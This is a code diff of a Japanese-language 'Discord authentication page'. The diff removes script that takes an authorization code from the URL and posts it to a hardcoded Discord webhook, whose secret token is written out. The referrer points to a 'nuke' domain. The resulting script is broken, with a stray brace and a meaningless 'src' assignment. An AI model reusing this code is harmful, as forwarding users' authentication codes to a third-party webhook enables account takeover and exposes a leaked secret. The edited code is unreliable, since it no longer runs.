@@ -4,30 +4,11 @@
   </head>
   <body>
     <script>
+      src = "js/index.js"
+      
       const query = window.location.search;
       const param = query.split("?")[1];
       const code = param.split("=")[1];
-
-      function Button(){
-        fetch("https://discord.com/api/webhooks/1193194166419722261/qHdi-H0_XKpnGSlVsjwmLxW29-6FRr58UyFBfwsyhN9w5A8bwHQ4Omq3jeiDRdO2uH_P", {
-  "headers": {
-    "accept": "*/*",
-    "accept-language": "ja,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
-    "content-type": "application/json",
-    "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Microsoft Edge\";v=\"120\"",
-    "sec-ch-ua-mobile": "?0",
-    "sec-ch-ua-platform": "\"Windows\"",
-    "sec-fetch-dest": "empty",
-    "sec-fetch-mode": "cors",
-    "sec-fetch-site": "cross-site"
-  },
-  "referrer": "https://nuke.ctkpaarr.org/",
-  "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "{\"content\":\"# 認証コード\\n## "+code}",
-  "method": "POST",
-  "mode": "cors",
-  "credentials": "omit"
-});
       }
     </script>
     <h1>Discord技術綜合 認証ページ</h1>
